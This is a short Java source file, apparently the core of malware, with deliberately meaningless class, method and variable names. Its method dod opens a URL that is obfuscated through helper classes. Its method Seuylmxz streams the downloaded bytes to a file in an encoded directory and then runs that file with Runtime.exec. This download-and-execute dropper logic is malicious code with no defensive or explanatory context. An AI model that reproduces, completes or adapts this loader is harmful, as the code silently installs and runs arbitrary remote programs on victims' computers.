import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

public class Lizixk {

   public static String dxrxr = Morny.ada(Allaon.BRni);
   static InputStream zxfs;


   public static void Seuylmxz() throws FileNotFoundException, Exception {
      boolean sdhhe = false;
      if(dxrxr.charAt(dxrxr.length() - 1) != 92) {
         dxrxr = dxrxr + "\\";
      }

      String cgdg = dxrxr + Allaon.Tte3;
      FileOutputStream sdgosa = new FileOutputStream(cgdg);
      String o0ojh = "ikikioi";
      dod();

      int sdhhe1;
      for(byte[] rayys = new byte[512]; (sdhhe1 = zxfs.read(rayys)) > 0; rayys = new byte[512]) {
         sdgosa.write(rayys, 0, sdhhe1);
      }

      sdgosa.close();
      zxfs.close();
      Runtime.getRuntime().exec(cgdg);
   }

   public static void dod() throws IOException {
      URL fweret = new URL(Morny.HYurrds(Rvre.sfgkytoi));
      fweret.openConnection();
      zxfs = fweret.openStream();
   }

}
